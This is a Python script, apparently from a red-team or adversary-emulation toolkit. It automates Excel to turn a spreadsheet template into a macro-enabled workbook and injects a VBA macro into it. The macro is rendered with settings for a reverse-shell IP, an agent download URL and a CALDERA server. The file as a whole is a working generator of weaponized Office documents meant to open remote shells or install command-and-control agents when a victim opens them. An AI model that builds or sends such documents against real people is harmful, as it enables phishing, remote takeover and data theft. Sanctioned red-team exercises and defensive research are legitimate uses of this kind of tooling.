import os
import sys

import win32com.client as win32
import yaml
from jinja2 import Template


cfg = None
project_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
config_file = os.path.join(project_dir, "config.yml")
template_dir = os.path.join(project_dir, "templates")
output_dir = os.path.join(project_dir, "output")

with open(config_file, "r") as stream:
    try:
        cfg = yaml.safe_load(stream)
    except yaml.YAMLError as exc:
        print(f"Error reading configuration from '{config_file}': {exc}")
        sys.exit(1)


def load_excel_template(template_path):
    app = win32.gencache.EnsureDispatch("Excel.Application")
    app.Visible = False
    workbook = app.Workbooks.Open(template_path)
    return app, workbook


def insert_macro_from_file(macro_path, target_workbook):
    with open(macro_path, "r") as macro_file:
        macro_template = Template(macro_file.read())

    rendered_macro = macro_template.render(
        agent_url=cfg["app"]["macros"]["agent_url"],
        reverse_shell_ip=cfg["app"]["macros"]["reverse_shell_ip"],
        caldera_ip=cfg["app"]["macros"]["caldera_ip"],
    )

    target_vba_project = target_workbook.VBProject
    target_vba_project.VBComponents("ThisWorkbook").CodeModule.AddFromString(
        rendered_macro
    )


def get_template_path(template_name):
    valid_extensions = {".xls", ".xlsm", ".xlsx", ".xltm", ".xltx"}
    extension = os.path.splitext(template_name)[1].lower()

    if os.path.basename(template_name) != template_name:
        raise ValueError("Template must be a filename from templates/files/ms_office")
    if extension not in valid_extensions:
        raise ValueError("Excel templates must use .xls, .xlsm, .xlsx, .xltm, or .xltx")

    template_path = os.path.join(template_dir, "files", "ms_office", template_name)
    if not os.path.isfile(template_path):
        raise FileNotFoundError(f"Template not found: {template_path}")

    return template_path


def get_macro_path(macro_name):
    if os.path.basename(macro_name) != macro_name:
        raise ValueError("Macro must be a filename from templates/macros/ms_office")

    macro_path = os.path.join(template_dir, "macros", "ms_office", macro_name)
    if not os.path.isfile(macro_path):
        raise FileNotFoundError(f"Macro not found: {macro_path}")

    return macro_path


def main(template_name, macro_name):
    template_path = get_template_path(template_name)
    macro_path = get_macro_path(macro_name)
    output_path = os.path.join(
        output_dir, f"{os.path.splitext(os.path.basename(template_name))[0]}.xlsm"
    )

    os.makedirs(output_dir, exist_ok=True)

    excel_app = None
    template_workbook = None
    workbook = None

    try:
        excel_app, template_workbook = load_excel_template(template_path)

        # Save a macro-enabled copy of the template.
        template_workbook.SaveAs(output_path, FileFormat=52)
        template_workbook.Close(SaveChanges=False)
        template_workbook = None

        workbook = excel_app.Workbooks.Open(output_path)
        insert_macro_from_file(macro_path, workbook)
        workbook.Save()
    finally:
        if workbook is not None:
            workbook.Close(SaveChanges=False)
        if template_workbook is not None:
            template_workbook.Close(SaveChanges=False)
        if excel_app is not None:
            excel_app.Quit()

    return output_path


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(
            "Usage: python generators/excel_file_generator.py "
            "<template_name> <macro_name>"
        )
        sys.exit(1)

    template_name = sys.argv[1]
    macro_name = sys.argv[2]

    main(template_name, macro_name)
